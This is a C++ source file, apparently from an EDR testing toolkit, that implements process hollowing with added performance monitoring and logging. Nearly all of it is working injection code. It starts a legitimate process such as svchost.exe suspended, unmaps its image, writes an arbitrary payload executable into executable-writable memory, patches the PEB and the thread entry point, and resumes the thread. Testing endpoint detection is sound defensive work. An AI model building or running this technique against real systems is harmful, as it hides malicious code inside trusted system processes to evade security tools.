/*
 * Process Hollowing with Performance Monitoring - EDR Testing Tools
 * Version 3: Enhanced with performance tracking
 * 
 * Enhancements in v3:
 * - Integrated PerformanceMonitor for detailed metrics
 * - Tracks execution time, memory usage, CPU, I/O
 * - Exports performance data to CSV/JSON
 * - Retains all v2 features (RAII, error handling, logging)
 * 
 * Features from v2:
 * - RAII-based resource management (HandleGuard, MemoryGuard)
 * - Structured exception handling with custom exceptions
 * - Comprehensive logging with Logger system
 * 
 * Performance Metrics Tracked:
 * - Execution time (microseconds)
 * - Memory usage (peak, current, delta)
 * - CPU usage (percentage, time)
 * - Disk I/O (read/write bytes and operations)
 * - Process information (PID, name)
 * 
 * Usage:
 *   process_hollowing_v3.exe <target_executable> <payload_executable>
 *   Example: process_hollowing_v3.exe C:\Windows\System32\svchost.exe C:\payload.exe
 * 
 * Build:
 *   cl process_hollowing_v3.cpp /std:c++17 /EHsc /I..\..\include
 */

#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include "../../include/logger.hpp"
#include "../../include/error_handling.hpp"
#include "../../include/performance_monitor.hpp"

using namespace EDR;

// Link with ntdll for NT APIs
#pragma comment(lib, "ntdll.lib")

// NT API declarations
typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

/*
 * Read file contents into memory
 * 
 * @param filename Path to file
 * @return Vector containing file contents
 */
std::vector<BYTE> ReadFileToMemory(const std::string& filename) {
    LOG_INFO("Reading file: " + filename);
    
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        throw Exception(ErrorCode::FILE_ACCESS_DENIED,
                       "Failed to open file: " + filename,
                       "ReadFileToMemory", __FILE__, __LINE__);
    }
    
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<BYTE> buffer(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        throw Exception(ErrorCode::FILE_ACCESS_DENIED,
                       "Failed to read file: " + filename,
                       "ReadFileToMemory", __FILE__, __LINE__);
    }
    
    LOG_INFO("File read successfully: " + std::to_string(size) + " bytes");
    return buffer;
}

/*
 * Perform process hollowing with performance monitoring
 * 
 * @param targetPath Path to legitimate target process
 * @param payloadPath Path to payload executable
 * @param monitor PerformanceMonitor reference for tracking
 * @return true if hollowing succeeds, false otherwise
 * 
 * Process:
 * 1. Start performance measurement
 * 2. Create target process in suspended state
 * 3. Get process PEB (Process Environment Block)
 * 4. Read payload from disk
 * 5. Unmap original image from target process
 * 6. Allocate memory for payload
 * 7. Write payload to target process
 * 8. Update process context (entry point)
 * 9. Resume target process
 * 10. Stop performance measurement
 */
bool PerformProcessHollowing(const std::string& targetPath,
                             const std::string& payloadPath,
                             PerformanceMonitor& monitor) {
    
    // Start performance measurement
    monitor.StartMeasurement("Process Hollowing",
                            "Hollow " + targetPath + " with " + payloadPath);
    
    try {
        LOG_INFO("=== Starting Process Hollowing ===");
        LOG_INFO("Target: " + targetPath);
        LOG_INFO("Payload: " + payloadPath);
        
        // Step 1: Read payload file
        std::vector<BYTE> payloadData = ReadFileToMemory(payloadPath);
        PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(payloadData.data());
        PIMAGE_NT_HEADERS ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
            payloadData.data() + dosHeader->e_lfanew);
        
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            throw Exception(ErrorCode::FILE_INVALID_FORMAT,
                           "Invalid DOS signature in payload",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            throw Exception(ErrorCode::FILE_INVALID_FORMAT,
                           "Invalid NT signature in payload",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        LOG_INFO("Payload validated: " + std::to_string(payloadData.size()) + " bytes");
        LOG_INFO("Image base: 0x" + 
                std::to_string(ntHeaders->OptionalHeader.ImageBase));
        LOG_INFO("Entry point: 0x" + 
                std::to_string(ntHeaders->OptionalHeader.AddressOfEntryPoint));
        
        // Step 2: Create target process in suspended state
        LOG_INFO("Creating suspended process: " + targetPath);
        
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        ZeroMemory(&pi, sizeof(pi));
        
        if (!CreateProcessA(
            targetPath.c_str(),
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi)) {
            DWORD error = GetLastError();
            throw Exception(ErrorCode::PROCESS_NOT_FOUND,
                           "Failed to create suspended process (Error: " + 
                           std::to_string(error) + ")",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        HandleGuard hProcess(pi.hProcess);
        HandleGuard hThread(pi.hThread);
        
        LOG_INFO("Process created (PID: " + std::to_string(pi.dwProcessId) + ")");
        
        // Step 3: Get process base address from PEB
        LOG_INFO("Reading process PEB...");
        
        PROCESS_BASIC_INFORMATION pbi;
        pfnNtQueryInformationProcess NtQueryInformationProcess = 
            reinterpret_cast<pfnNtQueryInformationProcess>(
                GetProcAddress(GetModuleHandleA("ntdll.dll"), 
                              "NtQueryInformationProcess"));
        
        if (!NtQueryInformationProcess) {
            throw Exception(ErrorCode::API_NOT_AVAILABLE,
                           "Failed to get NtQueryInformationProcess",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        NTSTATUS status = NtQueryInformationProcess(
            hProcess.get(),
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            NULL);
        
        if (status != 0) {
            throw Exception(ErrorCode::SYSTEM_CALL_FAILED,
                           "NtQueryInformationProcess failed",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        // Read image base address from PEB
        PVOID imageBaseAddress;
        SIZE_T bytesRead;
        
        if (!ReadProcessMemory(
            hProcess.get(),
            reinterpret_cast<PBYTE>(pbi.PebBaseAddress) + 0x10,
            &imageBaseAddress,
            sizeof(PVOID),
            &bytesRead)) {
            throw Exception(ErrorCode::MEMORY_READ_FAILED,
                           "Failed to read image base from PEB",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        LOG_INFO("Target image base: 0x" + 
                std::to_string(reinterpret_cast<uintptr_t>(imageBaseAddress)));
        
        // Step 4: Unmap original image
        LOG_INFO("Unmapping original image...");
        
        pfnNtUnmapViewOfSection NtUnmapViewOfSection = 
            reinterpret_cast<pfnNtUnmapViewOfSection>(
                GetProcAddress(GetModuleHandleA("ntdll.dll"), 
                              "NtUnmapViewOfSection"));
        
        if (!NtUnmapViewOfSection) {
            throw Exception(ErrorCode::API_NOT_AVAILABLE,
                           "Failed to get NtUnmapViewOfSection",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        status = NtUnmapViewOfSection(hProcess.get(), imageBaseAddress);
        if (status != 0) {
            LOG_WARN("NtUnmapViewOfSection returned: " + std::to_string(status));
        } else {
            LOG_INFO("Original image unmapped successfully");
        }
        
        // Step 5: Allocate memory for payload
        SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
        LOG_INFO("Allocating " + std::to_string(imageSize) + " bytes...");
        
        PVOID pRemoteImage = VirtualAllocEx(
            hProcess.get(),
            reinterpret_cast<PVOID>(ntHeaders->OptionalHeader.ImageBase),
            imageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        
        if (!pRemoteImage) {
            // Try allocating at any address
            LOG_WARN("Failed to allocate at preferred base, trying any address...");
            pRemoteImage = VirtualAllocEx(
                hProcess.get(),
                NULL,
                imageSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
        }
        
        if (!pRemoteImage) {
            throw Exception(ErrorCode::MEMORY_ALLOCATION_FAILED,
                           "Failed to allocate memory in target process",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        MemoryGuard memoryGuard(hProcess.get(), pRemoteImage, imageSize);
        LOG_INFO("Memory allocated at: 0x" + 
                std::to_string(reinterpret_cast<uintptr_t>(pRemoteImage)));
        
        // Step 6: Write headers
        LOG_INFO("Writing PE headers...");
        
        SIZE_T bytesWritten;
        if (!WriteProcessMemory(
            hProcess.get(),
            pRemoteImage,
            payloadData.data(),
            ntHeaders->OptionalHeader.SizeOfHeaders,
            &bytesWritten)) {
            throw Exception(ErrorCode::MEMORY_WRITE_FAILED,
                           "Failed to write PE headers",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        LOG_INFO("Headers written: " + std::to_string(bytesWritten) + " bytes");
        
        // Step 7: Write sections
        LOG_INFO("Writing PE sections...");
        
        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            PVOID sectionDest = reinterpret_cast<PBYTE>(pRemoteImage) + 
                               sectionHeader[i].VirtualAddress;
            PVOID sectionSrc = payloadData.data() + 
                              sectionHeader[i].PointerToRawData;
            
            if (!WriteProcessMemory(
                hProcess.get(),
                sectionDest,
                sectionSrc,
                sectionHeader[i].SizeOfRawData,
                &bytesWritten)) {
                LOG_WARN("Failed to write section: " + 
                        std::string(reinterpret_cast<char*>(sectionHeader[i].Name)));
            } else {
                LOG_INFO("Section written: " + 
                        std::string(reinterpret_cast<char*>(sectionHeader[i].Name)) + 
                        " (" + std::to_string(bytesWritten) + " bytes)");
            }
        }
        
        // Step 8: Update PEB with new image base
        LOG_INFO("Updating PEB with new image base...");
        
        if (!WriteProcessMemory(
            hProcess.get(),
            reinterpret_cast<PBYTE>(pbi.PebBaseAddress) + 0x10,
            &pRemoteImage,
            sizeof(PVOID),
            &bytesWritten)) {
            LOG_WARN("Failed to update PEB image base");
        }
        
        // Step 9: Set entry point in thread context
        LOG_INFO("Setting entry point...");
        
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        
        if (!GetThreadContext(hThread.get(), &ctx)) {
            throw Exception(ErrorCode::SYSTEM_CALL_FAILED,
                           "Failed to get thread context",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        ULONGLONG entryPoint = reinterpret_cast<ULONGLONG>(pRemoteImage) + 
                              ntHeaders->OptionalHeader.AddressOfEntryPoint;
        
#ifdef _WIN64
        ctx.Rcx = entryPoint;
#else
        ctx.Eax = entryPoint;
#endif
        
        if (!SetThreadContext(hThread.get(), &ctx)) {
            throw Exception(ErrorCode::SYSTEM_CALL_FAILED,
                           "Failed to set thread context",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        LOG_INFO("Entry point set to: 0x" + std::to_string(entryPoint));
        
        // Step 10: Resume thread
        LOG_INFO("Resuming main thread...");
        
        if (ResumeThread(hThread.get()) == static_cast<DWORD>(-1)) {
            throw Exception(ErrorCode::THREAD_CREATION_FAILED,
                           "Failed to resume thread",
                           "PerformProcessHollowing", __FILE__, __LINE__);
        }
        
        LOG_INFO("=== Process Hollowing Completed Successfully ===");
        LOG_INFO("Hollowed process PID: " + std::to_string(pi.dwProcessId));
        
        // Mark as successful
        monitor.SetSuccess(true);
        
        // Stop measurement and get metrics
        auto metrics = monitor.StopMeasurement();
        
        // Print immediate metrics
        std::cout << "\n[Performance Metrics]\n";
        std::cout << "  Execution Time: " 
                  << (metrics.executionTime.count() / 1000.0) << " ms\n";
        std::cout << "  Peak Memory: " 
                  << (metrics.peakMemoryUsage / 1024.0 / 1024.0) << " MB\n";
        std::cout << "  CPU Usage: " << metrics.cpuUsagePercent << " %\n";
        std::cout << "  Disk Read: " 
                  << (metrics.diskBytesRead / 1024.0) << " KB\n";
        
        return true;
        
    } catch (const Exception& e) {
        LOG_ERROR("Process Hollowing failed: " + std::string(e.what()));
        std::cerr << "[-] Error: " << e.what() << "\n";
        std::cerr << "[-] Error Code: " << static_cast<int>(e.code()) << "\n";
        
        monitor.SetSuccess(false);
        monitor.StopMeasurement();
        return false;
        
    } catch (const std::exception& e) {
        LOG_ERROR("Unexpected error: " + std::string(e.what()));
        std::cerr << "[-] Unexpected error: " << e.what() << "\n";
        
        monitor.SetSuccess(false);
        monitor.StopMeasurement();
        return false;
    }
}

int main(int argc, char* argv[]) {
    try {
        // Initialize logger
        auto& logger = Logger::Instance();
        logger.SetLevel(EDRLOG_INFO);
        logger.SetOutputFile("process_hollowing_v3.log");
        logger.EnableConsole(true);
        
        LOG_INFO("=== Process Hollowing v3 with Performance Monitoring Started ===");
        
        std::cout << "======================================================\n";
        std::cout << "    Process Hollowing v3 - Performance Monitoring\n";
        std::cout << "======================================================\n\n";
        
        // Check arguments
        if (argc != 3) {
            std::cerr << "Usage: " << argv[0] 
                     << " <target_path> <payload_path>\n";
            std::cerr << "Example: " << argv[0] 
                     << " C:\\Windows\\System32\\svchost.exe C:\\payload.exe\n";
            return 1;
        }
        
        std::string targetPath = argv[1];
        std::string payloadPath = argv[2];
        
        // Validate paths
        DWORD targetAttrs = GetFileAttributesA(targetPath.c_str());
        if (targetAttrs == INVALID_FILE_ATTRIBUTES) {
            std::cerr << "[-] Target executable not found: " << targetPath << "\n";
            LOG_ERROR("Target not found: " + targetPath);
            return 1;
        }
        
        DWORD payloadAttrs = GetFileAttributesA(payloadPath.c_str());
        if (payloadAttrs == INVALID_FILE_ATTRIBUTES) {
            std::cerr << "[-] Payload executable not found: " << payloadPath << "\n";
            LOG_ERROR("Payload not found: " + payloadPath);
            return 1;
        }
        
        // Create performance monitor
        PerformanceMonitor monitor;
        
        // Perform hollowing with performance tracking
        bool success = PerformProcessHollowing(targetPath, payloadPath, monitor);
        
        if (success) {
            std::cout << "\n[+] Hollowing completed successfully!\n";
            
            // Print detailed summary
            std::cout << "\n";
            monitor.PrintSummary();
            
            // Export performance data
            std::cout << "\nExporting performance data...\n";
            try {
                monitor.ExportToCSV("process_hollowing_performance.csv");
                std::cout << "[+] CSV exported: process_hollowing_performance.csv\n";
                
                monitor.ExportToJSON("process_hollowing_performance.json");
                std::cout << "[+] JSON exported: process_hollowing_performance.json\n";
                
            } catch (const Exception& e) {
                std::cerr << "[-] Export failed: " << e.what() << "\n";
            }
            
            return 0;
            
        } else {
            std::cerr << "\n[-] Hollowing failed!\n";
            std::cerr << "Check process_hollowing_v3.log for details.\n";
            return 1;
        }
        
    } catch (const Exception& e) {
        std::cerr << "\n[FATAL ERROR] " << e.what() << "\n";
        std::cerr << "Error Code: " << static_cast<int>(e.code()) << "\n";
        LOG_ERROR("Fatal error: " + std::string(e.what()));
        return 1;
        
    } catch (const std::exception& e) {
        std::cerr << "\n[FATAL ERROR] Unexpected: " << e.what() << "\n";
        LOG_ERROR("Unexpected error: " + std::string(e.what()));
        return 1;
        
    } catch (...) {
        std::cerr << "\n[FATAL ERROR] Unknown error occurred\n";
        LOG_ERROR("Unknown fatal error");
        return 1;
    }
}
